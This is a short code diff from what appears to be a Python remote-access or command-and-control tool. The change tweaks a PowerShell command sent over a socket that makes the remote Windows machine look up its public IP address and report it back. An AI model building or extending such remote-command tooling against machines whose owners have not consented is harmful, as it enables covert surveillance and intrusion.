@@ -149,7 +149,7 @@ get_users        - Lists all users on the local computer
     def get_public_ip(self, command = None) -> None:
         """ Fetches the users public IP Address
         """
-        self.connection.sendto('(Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String'.encode(), self.config.ip_tuple)
+        self.connection.sendto('(Invoke-WebRequest -UseBasicParsing -uri "https://api.ipify.org/").Content | Out-String'.encode(), self.config.ip_tuple)
         print(format_string(self.recvall()))
 
 
